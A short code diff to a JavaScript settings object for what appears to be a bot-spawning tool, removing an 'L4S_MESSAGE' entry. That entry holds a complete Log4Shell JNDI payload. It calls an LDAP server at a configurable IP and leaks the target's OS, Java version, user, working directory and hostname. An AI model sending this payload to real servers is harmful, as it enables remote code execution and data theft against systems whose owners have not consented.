@@ -36,9 +36,5 @@ export const settings = {
   BOT_NAME_PREFIX: requiredEnv("BOT_NAME_PREFIX"),
   BOT_NAME_LENGTH: 10,
   BOT_SPAWN_MESSAGE: requiredEnv("BOT_SPAWN_MESSAGE"),
-  L4S_MESSAGE:
-    "${jndi:ldap://" +
-    requiredEnv("L4S_SERVER_IP") +
-    ":8000/${java:os};${java:version};${env:USER:${env:USERNAME}};${env:PWD};${env:HOSTNAME}}",
   WORKER_RESTART_ON_FAILURE_DELAY: Number(requiredEnv("WORKER_RESTART_ON_FAILURE_DELAY"))
 };
